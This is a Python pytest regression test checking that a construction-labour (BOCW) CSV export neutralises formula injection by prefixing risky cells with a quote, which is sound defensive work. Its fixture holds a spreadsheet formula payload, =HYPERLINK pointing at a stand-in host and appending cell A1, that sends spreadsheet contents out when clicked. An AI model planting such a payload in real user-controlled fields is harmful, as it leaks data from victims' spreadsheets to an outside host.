"""R2-185 - the BOCW statutory CSV export must not emit executable formulas.

The export wrote contractor_name / acknowledgement_number (free text a user
controls) straight into cells, so a contractor named
`=HYPERLINK("http://x/?"&A1,"click")` executed in the finance team's
spreadsheet when the return was opened.

Gate: any cell whose value begins with = + - @ TAB or CR is exported with a
leading single quote (forced text), benign values pass through byte-identical,
and numbers/dates are never quoted.
"""
import csv
import io
import uuid

from app import models

_SUFFIX = uuid.uuid4().hex[:8]

_MONTH = "2026-08"


def _seed_bocw(client, hdr, company_id, project_id, name, ack):
    r = client.post(
        "/apis/v3/labour/bocw",
        headers=hdr,
        json={
            "company_id": str(company_id),
            "project_id": str(project_id),
            "contractor_name": name,
            "month_year": _MONTH,
            "workers_count": 10,
            "wages_paid": 50000.0,
            "contribution_amount": 100.0,
            "acknowledgement_number": ack,
        },
    )
    assert r.status_code == 201, r.text


def test_r2_185_bocw_export_neutralizes_formula_cells(client, db, make_tenant, auth_headers):
    comp, user, team = make_tenant(
        company_name=f"R2185-{_SUFFIX}", user_name="U2185",
        mobile=f"+9192{_SUFFIX}", email=f"r2185-{_SUFFIX}@test.com",
    )
    hdr = auth_headers(user, comp)
    project = models.Project(
        id=uuid.uuid4(), company_id=comp.id, name="P2185",
        code=f"PRJ-2185-{_SUFFIX}", status="Ongoing",
    )
    db.add(project)
    db.commit()

    evil = '=HYPERLINK("http://x/?"&A1,"click")'
    _seed_bocw(client, hdr, comp.id, project.id, evil, "+ACK/2026/001")
    _seed_bocw(client, hdr, comp.id, project.id, "ABC Builders Pvt Ltd", None)

    r = client.get(f"/apis/v3/labour/bocw/{project.id}/export", headers=hdr)
    assert r.status_code == 200, r.text

    rows = list(csv.reader(io.StringIO(r.text)))
    data = [row for row in rows[1:] if row]
    assert len(data) == 2, r.text

    by_contractor = {row[0]: row for row in data}

    # The formula payload is stored and exported as inert text.
    neutralized = by_contractor["'" + evil]
    assert neutralized[5] == "'+ACK/2026/001", neutralized

    # A benign contractor is untouched - no spurious quote prefix.
    benign = by_contractor["ABC Builders Pvt Ltd"]
    assert benign[1] == _MONTH, benign
    assert float(benign[3]) == 50000.0, benign

    # No raw line in the file may start with a formula character.
    body_lines = [ln for ln in r.text.splitlines()[1:] if ln]
    assert all(not ln.startswith(("=", "+", "-", "@")) for ln in body_lines), body_lines[:3]
